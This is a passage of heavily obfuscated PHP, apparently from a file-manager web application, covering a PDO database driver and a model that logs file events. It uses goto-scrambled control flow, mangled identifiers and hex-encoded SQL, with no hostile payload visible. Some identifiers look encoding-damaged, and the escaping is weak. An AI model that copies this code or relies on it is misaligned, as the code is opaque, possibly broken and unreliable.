—†¶²ª[848] . $this->dbType . $B¶ —†¶²ª[849] . $this->dbType . $B¶ —†¶²ª[850]); } goto cÊ‚Ùä…†; Fî¾ŞØ¥Š: if (empty($bä‹©çãøß)) { $bä‹©çãøß = $this->config; } $fí–µ“˜ = !empty($bä‹©çãøß[$B¶ —†¶²ª[13]][$B¶ —†¶²ª[14]]) ? $bä‹©çãøß[$B¶ —†¶²ª[13]][$B¶ —†¶²ª[14]] : $this->pconnect; if ($fí–µ“˜) { $bä‹©çãøß[$B¶ —†¶²ª[13]][PDO::ATTR_PERSISTENT] = !0; } goto Dƒ¶¨†Œ‘; cÊ‚Ùä…†: if (!$this->linkID[$eÃã—àªÎ¶]) { think_exception($B¶ —†¶²ª[851]); } try { $this->linkID[$eÃã—àªÎ¶]->exec($B¶ —†¶²ª[852] . think_config($B¶ —†¶²ª[819])); } catch (Exception $BºŸÉ“ÇÏÉ) { } $this->connected = !0; goto d»´ƒ­¢¸ò; d»´ƒ­¢¸ò: if (1 != think_config($B¶ —†¶²ª[18])) { unset($this->config); } goto f¥……–ùï°; f¥……–ùï°: } return $this->linkID[$eÃã—àªÎ¶]; } public function free() { $this->PDOStatement = null; } public function query($b³”î¨‚ß, $c‰šº‰±· = array()) { goto DèÜ¯ªçğŠ; D¬©§“¸‡…: think_action_status($D„ìöãÆ‘Ú[19], 1); think_status($D„ìöãÆ‘Ú[20]); $this->PDOStatement = $this->_linkID->prepare($b³”î¨‚ß); goto BĞè†•„Ö„; DèÜ¯ªçğŠ: $D„ìöãÆ‘Ú =& $_SERVER[ç]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto EÖ§Å°–˜; BĞè†•„Ö„: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $E¡™ò¿ŒÔ = $this->PDOStatement->execute($c‰šº‰±·); $this->debug(); goto CğÇÍİ»’; EÖ§Å°–˜: $this->queryStr = $b³”î¨‚ß; if (!empty($c‰šº‰±·)) { $this->queryStr .= $D„ìöãÆ‘Ú[853] . print_r($c‰šº‰±·, !0) . $D„ìöãÆ‘Ú[854]; } if (!empty($this->PDOStatement)) { $this->free(); } goto D¬©§“¸‡…; CğÇÍİ»’: if (!1 === $E¡™ò¿ŒÔ) { $this->error(); return !1; } else { return $this->getAll(); } goto d“”»Š‡ ‘; d“”»Š‡ ‘: } public function execute($C¤Ìéö®£, $bó¦Ûéß¨ = array()) { goto cä‘Ş¥ô›î; cœÚ·‡™áË: $this->queryStr = $C¤Ìéö®£; if (!empty($bó¦Ûéß¨)) { $this->queryStr .= $F²ÍĞí§ã¥[853] . print_r($bó¦Ûéß¨, !0) . $F²ÍĞí§ã¥[854]; } $cªÙ—ª‚ = !1; goto f¢Ö„Ğ™¥á; eåô…°§·ô: $b‹ÆĞË¹¦” = $this->PDOStatement->execute($bó¦Ûéß¨); $this->debug(); if (!1 === $b‹ÆĞË¹¦”) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($cªÙ—ª‚ || preg_match($F²ÍĞí§ã¥[859], $C¤Ìéö®£)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto A¥ÚñºŞ“É; b†ß«Ìïªî: think_status($F²ÍĞí§ã¥[20]); $this->PDOStatement = $this->_linkID->prepare($C¤Ìéö®£); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto eåô…°§·ô; f¢Ö„Ğ™¥á: if ($this->dbType == $F²ÍĞí§ã¥[847]) { if (preg_match($F²ÍĞí§ã¥[855], $this->queryStr, $c‘‰Öªê“Í)) { $this->table = think_config($F²ÍĞí§ã¥[856]) . str_ireplace(think_config($F²ÍĞí§ã¥[857]), $F²ÍĞí§ã¥[373], $c‘‰Öªê“Í[2]); $cªÙ—ª‚ = (bool) $this->query($F²ÍĞí§ã¥[858] . strtoupper($this->table) . $F²ÍĞí§ã¥[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($F²ÍĞí§ã¥[21], 1); goto b†ß«Ìïªî; cä‘Ş¥ô›î: $F²ÍĞí§ã¥ =& $_SERVER[ç]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto cœÚ·‡™áË; A¥ÚñºŞ“É: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $dõ…÷ÄŒõÜ = $this->_linkID->commit(); $this->transTimes = 0; if (!$dõ…÷ÄŒõÜ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $BèóÆ©›ôö = $this->_linkID->rollback(); $this->transTimes = 0; if (!$BèóÆ©›ôö) { $this->error(); return !1; } } return !0; } private function getAll() { $A‘èÛÅ¸Š… = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($A‘èÛÅ¸Š…); return $A‘èÛÅ¸Š…; } public function getFields($DÇÏÈÃˆó¬) { goto b½èïÅˆ£å; b½èïÅˆ£å: $Cİùƒ„šˆÕ =& $_SERVER[ç]; $this->initConnect(!0); if (think_config($Cİùƒ„šˆÕ[860])) { $fÁä©å‹’ = str_replace($Cİùƒ„šˆÕ[861], $DÇÏÈÃˆó¬, think_config($Cİùƒ„šˆÕ[860])); } else { switch ($this->dbType) { case $Cİùƒ„šˆÕ[844]: case $Cİùƒ„šˆÕ[862]: $fÁä©å‹’ = "\x53\x45\x4c\105\x43\124\40\x20\40\x63\157\154\165\155\x6e\x5f\x6e\141\155\x65\x20\x61\x73\40\x27\x4e\141\155\145\x27\54\40\x20\40\144\141\164\x61\x5f\x74\x79\x70\145\x20\x61\x73\40\x27\x54\x79\160\145\x27\x2c\x20\40\x20\143\x6f\x6c\165\x6d\x6e\x5f\144\145\146\141\x75\154\164\40\141\x73\x20\47\104\145\x66\x61\165\x6c\x74\x27\x2c\x20\x20\x20\151\163\x5f\156\165\x6c\x6c\141\x62\154\x65\x20\x61\x73\x20\x27\116\x75\x6c\154\47\12\11\11\106\122\117\115\11\151\x6e\146\x6f\162\155\141\x74\151\157\156\x5f\163\143\x68\x65\x6d\141\x2e\x74\141\x62\154\145\x73\40\101\123\40\164\xa\x9\x9\112\x4f\111\x4e\x9\151\156\146\x6f\x72\x6d\141\x74\151\x6f\x6e\137\x73\143\150\x65\x6d\x61\x2e\143\157\x6c\165\x6d\156\163\40\101\123\x20\143\12\x9\x9\117\116\x20\40\x74\x2e\164\141\x62\x6c\x65\137\x63\141\164\x61\x6c\x6f\x67\x20\x3d\x20\x63\x2e\164\141\142\154\145\137\x63\x61\164\x61\x6c\157\147\xa\11\11\101\x4e\x44\x20\x74\x2e\x74\141\142\x6c\x65\x5f\163\x63\x68\x65\x6d\141\40\75\40\143\56\x74\141\142\x6c\145\137\163\x63\150\145\155\141\xa\x9\x9\x41\x4e\104\x20\x74\56\164\141\142\154\145\x5f\x6e\141\x6d\x65\x20\x3d\x20\x63\56\x74\x61\x62\x6c\x65\x5f\x6e\141\x6d\145\12\11\11\127\110\105\x52\105\x20\40\x20\164\x2e\x74\141\142\x6c\145\x5f\156\x61\155\145\x20\75\40\47{$DÇÏÈÃˆó¬}\x27"; break; case $Cİùƒ„šˆÕ[863]: $fÁä©å‹’ = $Cİùƒ„šˆÕ[864] . $DÇÏÈÃˆó¬ . $Cİùƒ„šˆÕ[865]; break; case $Cİùƒ„šˆÕ[845]: case $Cİùƒ„šˆÕ[847]: $fÁä©å‹’ = $Cİùƒ„šˆÕ[866] . $Cİùƒ„šˆÕ[867] . $Cİùƒ„šˆÕ[868] . strtoupper($DÇÏÈÃˆó¬) . $Cİùƒ„šˆÕ[869] . strtoupper($DÇÏÈÃˆó¬) . $Cİùƒ„šˆÕ[870]; break; case $Cİùƒ„šˆÕ[871]: $fÁä©å‹’ = $Cİùƒ„šˆÕ[872] . $DÇÏÈÃˆó¬ . $Cİùƒ„šˆÕ[873]; break; case $Cİùƒ„šˆÕ[846]: break; case $Cİùƒ„šˆÕ[874]: default: $fÁä©å‹’ = $Cİùƒ„šˆÕ[875] . ($this->dbType == $Cİùƒ„šˆÕ[874] ? "\x60{$DÇÏÈÃˆó¬}\140" : $DÇÏÈÃˆó¬); } } goto DÕé…¥Ö©¤; DÕé…¥Ö©¤: $Eœèˆ…î•ñ = $this->query($fÁä©å‹’); $a²˜Ğ”ø¶ = array(); if ($Eœèˆ…î•ñ) { foreach ($Eœèˆ…î•ñ as $F­‰Ñø¥ => $d«ÅÃø½ê) { $d«ÅÃø½ê = array_change_key_case($d«ÅÃø½ê); $d«ÅÃø½ê[$Cİùƒ„šˆÕ[28]] = isset($d«ÅÃø½ê[$Cİùƒ„šˆÕ[28]]) ? $d«ÅÃø½ê[$Cİùƒ„šˆÕ[28]] : $Cİùƒ„šˆÕ[373]; $d«ÅÃø½ê[$Cİùƒ„šˆÕ[29]] = isset($d«ÅÃø½ê[$Cİùƒ„šˆÕ[29]]) ? $d«ÅÃø½ê[$Cİùƒ„šˆÕ[29]] : $Cİùƒ„šˆÕ[373]; $CŞñÈÚé¤æ = isset($d«ÅÃø½ê[$Cİùƒ„šˆÕ[269]]) ? $d«ÅÃø½ê[$Cİùƒ„šˆÕ[269]] : $d«ÅÃø½ê[$Cİùƒ„šˆÕ[28]]; $a²˜Ğ”ø¶[$CŞñÈÚé¤æ] = array($Cİùƒ„šˆÕ[28] => $CŞñÈÚé¤æ, $Cİùƒ„šˆÕ[29] => $d«ÅÃø½ê[$Cİùƒ„šˆÕ[29]], $Cİùƒ„šˆÕ[31] => (bool) (isset($d«ÅÃø½ê[$Cİùƒ„šˆÕ[102]]) && $d«ÅÃø½ê[$Cİùƒ„šˆÕ[102]] === $Cİùƒ„šˆÕ[33] || isset($d«ÅÃø½ê[$Cİùƒ„šˆÕ[31]]) && $d«ÅÃø½ê[$Cİùƒ„šˆÕ[31]] === $Cİùƒ„šˆÕ[33]), $Cİùƒ„šˆÕ[34] => isset($d«ÅÃø½ê[$Cİùƒ„šˆÕ[34]]) ? $d«ÅÃø½ê[$Cİùƒ„šˆÕ[34]] : (isset($d«ÅÃø½ê[$Cİùƒ„šˆÕ[53]]) ? $d«ÅÃø½ê[$Cİùƒ„šˆÕ[53]] : $Cİùƒ„šˆÕ[373]), $Cİùƒ„šˆÕ[36] => isset($d«ÅÃø½ê[$Cİùƒ„šˆÕ[92]]) ? strtolower($d«ÅÃø½ê[$Cİùƒ„šˆÕ[92]]) == $Cİùƒ„šˆÕ[38] : (isset($d«ÅÃø½ê[$Cİùƒ„šˆÕ[54]]) ? $d«ÅÃø½ê[$Cİùƒ„šˆÕ[54]] : !1), $Cİùƒ„šˆÕ[39] => isset($d«ÅÃø½ê[$Cİùƒ„šˆÕ[876]]) ? strtolower($d«ÅÃø½ê[$Cİùƒ„šˆÕ[876]]) == $Cİùƒ„šˆÕ[41] : (isset($d«ÅÃø½ê[$Cİùƒ„šˆÕ[92]]) ? $d«ÅÃø½ê[$Cİùƒ„šˆÕ[92]] : !1)); } } goto b¬§ëÇÌ¢; b¬§ëÇÌ¢: return $a²˜Ğ”ø¶; goto C‰ºõ—ŞÒ‘; C‰ºõ—ŞÒ‘: } public function getTables($BÉ–øóçµ = '') { $E šÌ®Ë¤ =& $_SERVER[ç]; if (think_config($E šÌ®Ë¤[877])) { $E¦‰Çê»¥ = str_replace($E šÌ®Ë¤[878], $BÉ–øóçµ, think_config($E šÌ®Ë¤[877])); } else { switch ($this->dbType) { case $E šÌ®Ë¤[845]: case $E šÌ®Ë¤[847]: $E¦‰Çê»¥ = $E šÌ®Ë¤[879]; break; case $E šÌ®Ë¤[844]: case $E šÌ®Ë¤[862]: $E¦‰Çê»¥ = $E šÌ®Ë¤[880]; break; case $E šÌ®Ë¤[871]: $E¦‰Çê»¥ = $E šÌ®Ë¤[881]; break; case $E šÌ®Ë¤[846]: think_exception(think_lang($E šÌ®Ë¤[882]) . $E šÌ®Ë¤[883]); break; case $E šÌ®Ë¤[863]: $E¦‰Çê»¥ = $E šÌ®Ë¤[42] . $E šÌ®Ë¤[43] . $E šÌ®Ë¤[44]; break; case $E šÌ®Ë¤[874]: default: if (!empty($BÉ–øóçµ)) { $E¦‰Çê»¥ = $E šÌ®Ë¤[827] . $BÉ–øóçµ . $E šÌ®Ë¤[828]; } else { $E¦‰Çê»¥ = $E šÌ®Ë¤[829]; } } } $CË³ ±«¯ª = $this->query($E¦‰Çê»¥); $dŠ”Å¥¶Ãø = array(); foreach ($CË³ ±«¯ª as $E®Ñîà¶¾ê => $D¿ïø§ºö) { $dŠ”Å¥¶Ãø[$E®Ñîà¶¾ê] = current($D¿ïø§ºö); } return $dŠ”Å¥¶Ãø; } protected function parseLimit($fàÊŠš¶°Ç) { $cŞ´âÛùÏ =& $_SERVER[ç]; $E‘ÃÙ††Ü¿ = $cŞ´âÛùÏ[33]; if (!empty($fàÊŠš¶°Ç)) { switch ($this->dbType) { case $cŞ´âÛùÏ[871]: case $cŞ´âÛùÏ[863]: $fàÊŠš¶°Ç = explode($cŞ´âÛùÏ[47], $fàÊŠš¶°Ç); if (count($fàÊŠš¶°Ç) > 1) { $E‘ÃÙ††Ü¿ .= $cŞ´âÛùÏ[48] . $fàÊŠš¶°Ç[1] . $cŞ´âÛùÏ[49] . $fàÊŠš¶°Ç[0] . $cŞ´âÛùÏ[50]; } else { $E‘ÃÙ††Ü¿ .= $cŞ´âÛùÏ[48] . $fàÊŠš¶°Ç[0] . $cŞ´âÛùÏ[50]; } break; case $cŞ´âÛùÏ[844]: case $cŞ´âÛùÏ[862]: break; case $cŞ´âÛùÏ[846]: break; case $cŞ´âÛùÏ[845]: case $cŞ´âÛùÏ[847]: break; case $cŞ´âÛùÏ[874]: default: $E‘ÃÙ††Ü¿ .= $cŞ´âÛùÏ[48] . $fàÊŠš¶°Ç . $cŞ´âÛùÏ[50]; } } return $E‘ÃÙ††Ü¿; } public function parseKey(&$e½ñŞ‡Ø¶, $C¸ÚÎ« = true) { $BãÈğá“¹Ì =& $_SERVER[ç]; if ($C¸ÚÎ«) { $e½ñŞ‡Ø¶ = $this->parseKeyCheck($e½ñŞ‡Ø¶); } if ($this->dbType == $BãÈğá“¹Ì[874]) { if ($e½ñŞ‡Ø¶ != $BãÈğá“¹Ì[182] && !preg_match($BãÈğá“¹Ì[839], $e½ñŞ‡Ø¶)) { $e½ñŞ‡Ø¶ = $BãÈğá“¹Ì[380] . trim($e½ñŞ‡Ø¶, $BãÈğá“¹Ì[380]) . $BãÈğá“¹Ì[380]; } return $e½ñŞ‡Ø¶; } else { return parent::parseKey($e½ñŞ‡Ø¶); } } public function close() { $this->_linkID = null; } public function error() { $fœÀ±½É =& $_SERVER[ç]; if ($this->PDOStatement) { $BäÚ‘®©Ú¸ = $this->PDOStatement->errorInfo(); $this->error = $BäÚ‘®©Ú¸[1] . $fœÀ±½É[4] . $BäÚ‘®©Ú¸[2]; } else { $this->error = $fœÀ±½É[33]; } if ($fœÀ±½É[33] != $this->queryStr) { $this->error .= LNG($fœÀ±½É[45]) . $this->queryStr; } think_trace($this->error, $fœÀ±½É[33], $fœÀ±½É[46]); return $this->error; } public function escapeString($d¿ä¨ÕâØÈ) { $e”éÒ¯¶Èì =& $_SERVER[ç]; switch ($this->dbType) { case $e”éÒ¯¶Èì[871]: case $e”éÒ¯¶Èì[844]: case $e”éÒ¯¶Èì[862]: case $e”éÒ¯¶Èì[874]: return addslashes($d¿ä¨ÕâØÈ); case $e”éÒ¯¶Èì[846]: case $e”éÒ¯¶Èì[863]: case $e”éÒ¯¶Èì[845]: case $e”éÒ¯¶Èì[847]: return str_ireplace($e”éÒ¯¶Èì[55], $e”éÒ¯¶Èì[56], $d¿ä¨ÕâØÈ); } } protected function parseValue($Eó¤¹èİÄ‹) { $fšóØéö£½ =& $_SERVER[ç]; if (is_string($Eó¤¹èİÄ‹)) { $Eó¤¹èİÄ‹ = strpos($Eó¤¹èİÄ‹, $fšóØéö£½[4]) === 0 ? $this->escapeString($Eó¤¹èİÄ‹) : $fšóØéö£½[884] . $this->escapeString($Eó¤¹èİÄ‹) . $fšóØéö£½[884]; } elseif (isset($Eó¤¹èİÄ‹[0]) && is_string($Eó¤¹èİÄ‹[0]) && strtolower($Eó¤¹èİÄ‹[0]) == $fšóØéö£½[293]) { $Eó¤¹èİÄ‹ = $this->escapeString($Eó¤¹èİÄ‹[1]); } elseif (is_array($Eó¤¹èİÄ‹)) { $Eó¤¹èİÄ‹ = array_map(array($this, $fšóØéö£½[885]), $Eó¤¹èİÄ‹); } elseif (is_bool($Eó¤¹èİÄ‹)) { $Eó¤¹èİÄ‹ = $Eó¤¹èİÄ‹ ? $fšóØéö£½[86] : $fšóØéö£½[491]; } elseif (is_null($Eó¤¹èİÄ‹)) { $Eó¤¹èİÄ‹ = $fšóØéö£½[102]; } return $Eó¤¹èİÄ‹; } public function getLastInsertId() { $cƒÔÛîèØÔ =& $_SERVER[ç]; switch ($this->dbType) { case $cƒÔÛîèØÔ[871]: case $cƒÔÛîèØÔ[863]: case $cƒÔÛîèØÔ[844]: case $cƒÔÛîèØÔ[862]: case $cƒÔÛîèØÔ[846]: case $cƒÔÛîèØÔ[874]: return $this->_linkID->lastInsertId(); case $cƒÔÛîèØÔ[845]: case $cƒÔÛîèØÔ[847]: $Aªä³‰İö = $this->table; $aëˆ´‹‹ÖÜ = $this->query("\x53\105\114\105\103\124\x20{$Aªä³‰İö}\56\x63\x75\162\162\166\141\x6c\x20\x63\x75\162\162\166\x61\154\x20\x46\122\x4f\x4d\x20\144\165\x61\x6c"); return $aëˆ´‹‹ÖÜ ? $aëˆ´‹‹ÖÜ[0][$cƒÔÛîèØÔ[886]] : 0; } } } goto Eå½‰¡‚‘İ; eÔğÕ…¹£: class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\x6f\165\162\143\x65\137\x65\166\145\x6e\x74"; protected $dataAuto = array(array("\143\x72\x65\x61\164\145\x54\x69\x6d\145", "\x74\151\155\x65", "\x69\x6e\163\145\x72\x74", "\x66\165\x6e\143\164\151\157\x6e"), array("\x64\x65\163\x63", '', "\x69\156\163\145\162\x74\54\165\160\x64\x61\x74\x65\54\163\x65\x6c\145\143\x74", "\152\x73\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($AªßÔÓ«Ş„, $aÙšöéŠò‡, $F‹â¥Á¿ä = '') { goto bõùíæì¾†; bõùíæì¾†: $CÁÛ¨Üºˆ =& $_SERVER[ç]; if (!$this->eventSave) { return; } $C×‚ØØØøß = Model($CÁÛ¨Üºˆ[1171])->sourceInfo($AªßÔÓ«Ş„); goto d„­‚”Ÿ¡Š; aÏùÄç¥: $BˆÌÊô×ùø = array($CÁÛ¨Üºˆ[404] => $AªßÔÓ«Ş„, $CÁÛ¨Üºˆ[1863] => $C×‚ØØØøß[$CÁÛ¨Üºˆ[472]], $CÁÛ¨Üºˆ[1864] => $C×‚ØØØøß[$CÁÛ¨Üºˆ[28]], $CÁÛ¨Üºˆ[489] => $C×‚ØØØøß[$CÁÛ¨Üºˆ[489]], $CÁÛ¨Üºˆ[1483] => USER_ID, $CÁÛ¨Üºˆ[409] => $aÙšöéŠò‡, $CÁÛ¨Üºˆ[1485] => $F‹â¥Á¿ä); $this->addSystemLog($aÙšöéŠò‡, $BˆÌÊô×ùø); return $this->add($BˆÌÊô×ùø); goto FÃÛä›®ùƒ; d„­‚”Ÿ¡Š: if (!$C×‚ØØØøß) { return !1; } if ($this->isCacheEvent($C×‚ØØØøß, $aÙšöéŠò‡)) { return; } if ($F‹â¥Á¿ä && is_string($F‹â¥Á¿ä)) { $F‹â¥Á¿ä = array($CÁÛ¨Üºˆ[1687] => $F‹â¥Á¿ä); } goto aÏùÄç¥; FÃÛä›®ùƒ: } private function addSystemLog($EÒ¿ãšÈÅÜ, $F×°Å³„¡) { $Båöïå‚‰Ä =& $_SERVER[ç]; if ($EÒ¿ãšÈÅÜ == $Båöïå‚‰Ä[1865]) { $EÒ¿ãšÈÅÜ = $F×°Å³„¡[$Båöïå‚‰Ä[425]][$Båöïå‚‰Ä[1866]]; } else { if (in_array($EÒ¿ãšÈÅÜ, array($Båöïå‚‰Ä[1631], $Båöïå‚‰Ä[1867]))) { $EÒ¿ãšÈÅÜ = $F×°Å³„¡[$Båöïå‚‰Ä[425]][$Båöïå‚‰Ä[698]]; } } $aÂ¢ÆİÄ = array_merge($F×°Å³„¡, array($Båöïå‚‰Ä[1868] => $F×°Å³„¡[$Båöïå‚‰Ä[390]], $Båöïå‚‰Ä[1869] => $F×°Å³„¡[$Båöïå‚‰Ä[1869]])); Model($Båöïå‚‰Ä[1595])->addLog($Båöïå‚‰Ä[1870] . $EÒ¿ãšÈÅÜ, $aÂ¢ÆİÄ); } private function isCacheEvent($DÕÜ³¿Œ’, $EÂâêÕ’ùÄ) { if ($DÕÜ³¿Œ’[$_SERVER[ç][398]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($bßƒ“Èò«ß, $Bø¾ÑØŠêÀ) { $E¯Ÿğµ©²å =& $_SERVER[ç]; $fÃØƒèÈ  = Model($E¯Ÿğµ©²å[1171])->sourceInfo($bßƒ“Èò«ß); $dîîÑÀãóœ = array($E¯Ÿğµ©²å[1866] => $Bø¾ÑØŠêÀ, $E¯Ÿğµ©²å[28] => $fÃØƒèÈ [$E¯Ÿğµ©²å[28]]); return $this->addEvent($bßƒ“Èò«ß, $E¯Ÿğµ©²å[1865], $dîîÑÀãóœ); } public function eventFileEdit($fÖ®÷­’) { $D³ÔÖÊÔê³ =& $_SERVER[ç]; $aøÁÙãØç = array($D³ÔÖÊÔê³[1871] => $_SERVER[$D³ÔÖÊÔê³[1872]], $D³ÔÖÊÔê³[1873] => strtolower(ACTION)); return $this->addEvent($fÖ®÷­’, $D³ÔÖÊÔê³[1621], $aøÁÙãØç); } public function eventRecycle($f·¦Æ±œË, $aäì•¦ÑÂ) { return $this->addEvent($f·¦Æ±œË, $_SERVER[ç][1867], $aäì•¦ÑÂ); } public function eventRemove($C”“ÊíÏÒ¨) { $f“ğ†¼’”„ =& $_SERVER[ç]; $A›ÊÓÒ‹× = Model($f“ğ†¼’”„[1171])->sourceInfo($C”“ÊíÏÒ¨); $a¬™ˆˆ×§­ = $A›ÊÓÒ‹×[$f“ğ†¼’”„[28]]; return $this->addEvent($A›ÊÓÒ‹×[$f“ğ†¼’”„[472]], $f“ğ†¼’”„[1620], $a¬™ˆˆ×§­); } public function eventShare($EŒî…áö¼‚, $DÜòÌêè Õ) { return $this->addEvent($EŒî…áö¼‚, $_SERVER[ç][1631], $DÜòÌêè Õ); } public function eventMove($dÊæÙ«ƒ´÷, $bó“Ó÷•Æ, $eÕéªƒ™œõ) { goto C·’àˆŞ¾; Aä‰óíïĞê: $e£‰²‹…ÇŞ = $eïÇìËÇ·->sourceInfo($bó“Ó÷•Æ); $d†’ªÂä†É = $eïÇìËÇ·->sourceInfo($eÕéªƒ™œõ); $D‚µİ¸œ¾ğ = array($e…ë„–¿ò[1022] => $bó“Ó÷•Æ, $e…ë„–¿ò[1874] => $e£‰²‹…ÇŞ[$e…ë„–¿ò[28]], $e…ë„–¿ò[1854] => $e£‰²‹…ÇŞ[$e…ë„–¿ò[489]], $e…ë„–¿ò[1023] => $eÕéªƒ™œõ, $e…ë„–¿ò[1875] => $d†’ªÂä†É[$e…ë„–¿ò[28]], $e…ë„–¿ò[1876] => $d†’ªÂä†É[$e…ë„–¿ò[489]]); goto Dæ³ÅÄ‚Š; DØÒİ•«Ş‡: $this->addEvent($bó“Ó÷•Æ, $e…ë„–¿ò[1877], $D‚µİ¸œ¾ğ); goto b±ÄæÛ¹ù; C·’àˆŞ¾: $e…ë„–¿ò =& $_SERVER[ç]; $eïÇìËÇ· = Model($e…ë„–¿ò[1171]); $E¬Ï†¡„ñØ = $eïÇìËÇ·->sourceInfo($dÊæÙ«ƒ´÷); goto Aä‰óíïĞê; Dæ³ÅÄ‚Š: $this->addEvent($dÊæÙ«ƒ´÷, $e…ë„–¿ò[515], $D‚µİ¸œ¾ğ); $E¬Ï†¡„ñØ = $eïÇìËÇ·->sourceInfo($dÊæÙ«ƒ´÷); $D‚µİ¸œ¾ğ = array($e…ë„–¿ò[390] => $E¬Ï†¡„ñØ[$e…ë„–¿ò[390]], $e…ë„–¿ò[28] => $E¬Ï†¡„ñØ[$e…ë„–¿ò[28]]); goto DØÒİ•«Ş‡; b±ÄæÛ¹ù: } public function eventCopy($eŒò¡¡‹¹) { $this->eventCreate($eŒò¡¡‹¹, $_SERVER[ç][513]); } public function eventRename($EìÅˆƒïÌ•, $eŸËÊŒ¾Å°, $DíÚ„ÆÈ°³) { $BƒàùŸÁ¦Í =& $_SERVER[ç]; $AŠÉ´÷ÁŞ = array($BƒàùŸÁ¦Í[1022] => $eŸËÊŒ¾Å°, $BƒàùŸÁ¦Í[1023] => $DíÚ„ÆÈ°³); return $this->addEvent($EìÅˆƒïÌ•, $BƒàùŸÁ¦Í[1184], $AŠÉ´÷ÁŞ); } public function eventAddComment($b‹‰áé–›, $E“’ÂíÌ) { return $this->addEvent($b‹‰áé–›, $_SERVER[ç][1878], $E“’ÂíÌ); } public function eventAddDesc($D•Õ£æÏ©, $b”¹ó”¢ÍÉ) { return $this->addEvent($D•Õ£æÏ©, $_SERVER[ç][1879], $b”¹ó”¢ÍÉ); } public function listBySource($Bî¿À¯º‡ä) { goto b†±ò¨¾‘é; B ìÅÁ¤³: if ($eî’«—Èº[$bØ‚™™ïŠ[397]] == $bØ‚™™ïŠ[86]) { $A•ß¤œœ = Model($bØ‚™™ïŠ[1171])->listSearchChildren($Bî¿À¯º‡ä, 20000); $A•ß¤œœ[] = $Bî¿À¯º‡ä . $bØ‚™™ïŠ[373]; $c÷“ŠØ¦¢ = array($bØ‚™™ïŠ[390] => array($bØ‚™™ïŠ[7], $A•ß¤œœ)); } $C§ ÖóÈ‰… = $this->where($c÷“ŠØ¦¢)->order($bØ‚™™ïŠ[1880])->selectPage(); if ($C§ ÖóÈ‰…[$bØ‚™™ïŠ[362]][$bØ‚™™ïŠ[363]] == 0) { $C§ ÖóÈ‰…[$bØ‚™™ïŠ[362]][$bØ‚™™ïŠ[363]] = 1; $C§ ÖóÈ‰…[$bØ‚™™ïŠ[365]] = array(array($bØ‚™™ïŠ[404] => $Bî¿À¯º‡ä, $bØ‚™™ïŠ[1863] => $eî’«—Èº[$bØ‚™™ïŠ[472]], $bØ‚™™ïŠ[1483] => $eî’«—Èº[$bØ‚™™ïŠ[426]], $bØ‚™™ïŠ[409] => $bØ‚™™ïŠ[1881], $bØ‚™™ïŠ[410] => $eî’«—Èº[$bØ‚™™ïŠ[192]], $bØ‚™™ïŠ[1485] => $bØ‚™™ïŠ[33])); } goto C¼áÆ¼Ê¦µ; b†±ò¨¾‘é: $bØ‚™™ïŠ =& $_SERVER[ç]; $eî’«—Èº = Model($bØ‚™™ïŠ[1171])->sourceInfo($Bî¿À¯º‡ä); $c÷“ŠØ¦¢ = array($bØ‚™™ïŠ[404] => $Bî¿À¯º‡ä); goto B ìÅÁ¤³; C¼áÆ¼Ê¦µ: return $this->eventListParse($C§ ÖóÈ‰…, $Bî¿À¯º‡ä); goto aÔ…Ä·¯Ò; aÔ…Ä·¯Ò: } private function eventListParse($f¦¸Å¼»Õí, $Aôß½‡Í¬) { goto bï‘Ù¬ÂØº; F‰¬ÈŠŸ¦: $D›ô´Ñ‘Ó = Model($FŠ¢ƒ–±”Ø[760])->sourceListInfo($C‰Ü†’¹ğ, !0); foreach ($B……Êº›ˆ as &$B×ãÂóÊµ¹) { if ($B×ãÂóÊµ¹[$FŠ¢ƒ–±”Ø[29]] == $FŠ¢ƒ–±”Ø[515] && isset($B×ãÂóÊµ¹[$FŠ¢ƒ–±”Ø[425]][$FŠ¢ƒ–±”Ø[1022]])) { $B×ãÂóÊµ¹[$FŠ¢ƒ–±”Ø[425]][$FŠ¢ƒ–±”Ø[1022]] = $D›ô´Ñ‘Ó[$B×ãÂóÊµ¹[$FŠ¢ƒ–±”Ø[425]][$FŠ¢ƒ–±”Ø[1022]]]; $B×ãÂóÊµ¹[$FŠ¢ƒ–±”Ø[425]][$FŠ¢ƒ–±”Ø[1023]] = $D›ô´Ñ‘Ó[$B×ãÂóÊµ¹[$FŠ¢ƒ–±”Ø[425]][$FŠ¢ƒ–±”Ø[1023]]]; } if ($B×ãÂóÊµ¹[$FŠ¢ƒ–±”Ø[29]] == $FŠ¢ƒ–±”Ø[1877] && isset($B×ãÂóÊµ¹[$FŠ¢ƒ–±”Ø[425]][$FŠ¢ƒ–±”Ø[390]])) { $B×ãÂóÊµ¹[$FŠ¢ƒ–±”Ø[425]][$FŠ¢ƒ–±”Ø[390]] = $D›ô´Ñ‘Ó[$B×ãÂóÊµ¹[$FŠ¢ƒ–±”Ø[425]][$FŠ¢ƒ–±”Ø[390]]]; } $B×ãÂóÊµ¹[$FŠ¢ƒ–±”Ø[84]] = $D›ô´Ñ‘Ó[$B×ãÂóÊµ¹[$FŠ¢ƒ–±”Ø[390]]]; $B×ãÂóÊµ¹[$FŠ¢ƒ–±”Ø[1882]] = $D›ô´Ñ‘Ó[$B×ãÂóÊµ¹[$FŠ¢ƒ–±”Ø[1869]]]; if ($B×ãÂóÊµ¹[$FŠ¢ƒ–±”Ø[29]] == $FŠ¢ƒ–±”Ø[1620]) { $B×ãÂóÊµ¹[$FŠ¢ƒ–±”Ø[1882]] = $B×ãÂóÊµ¹[$FŠ¢ƒ–±”Ø[84]]; $B×ãÂóÊµ¹[$FŠ¢ƒ–±”Ø[1869]] = 